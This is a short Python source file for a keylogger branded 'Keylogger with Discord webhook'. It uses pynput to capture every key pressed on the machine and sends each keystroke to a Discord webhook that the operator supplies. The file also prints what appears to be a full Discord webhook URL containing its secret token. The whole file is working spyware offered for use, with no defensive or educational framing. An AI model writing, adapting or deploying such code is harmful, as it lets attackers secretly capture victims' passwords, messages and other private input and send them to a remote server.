from pynput.keyboard import Key, Listener
from dhooks import Webhook
import logging
import colorama
from colorama import Fore, Back, Style
from colorama import init
from termcolor import colored
colorama.init(autoreset=True)

# ---------- Title of the project // Bar to beautify the UI ----------

print(f"""{Fore.BLUE}
██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
█████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║ █░█░█ █ ▀█▀ █░█   █▀▄ █ █▀ █▀▀ █▀█ █▀█ █▀▄   █░█░█ █▀▀ █▄▄ █░█ █▀█ █▀█ █▄▀
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝ ▀▄▀▄▀ █ ░█░ █▀█   █▄▀ █ ▄█ █▄▄ █▄█ █▀▄ █▄▀   ▀▄▀▄▀ ██▄ █▄█ █▀█ █▄█ █▄█ █░█

{Fore.GREEN}▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼
""")

# ---------- Input command so that you can enter the webhook URL // coloured ----------

hook = print(Fore.GREEN + "https://discord.com/api/webhooks/1406631924981563421/srBE-7HercrIYQrjYw2v-3-LqeJtFGjxZ9ZCWXVWDYqgwBvCI1mv4E7wkyN5K9E1eS_R", end='')
Webhook1 = input()

# ---------- Spacers for a better overview ----------

print(" ")

# ---------- Note that the program runs successfully ----------

print(f"{Fore.GREEN}Keylogger started all input will be sent to your Discord webhook.")

# ---------- Spacers for a better overview ----------

print(" ")

# ---------- Bar to beautify the UI ----------

print(f"{Fore.GREEN}▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼")

# ---------- Redefining the variable ----------

log_send = Webhook(Webhook1)

# ---------- The main part in which the pressed key is recorded and sent to the webhook ---------

def on_press(key):
    logging.info(str(key))


    print(key)


    log_send.send(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
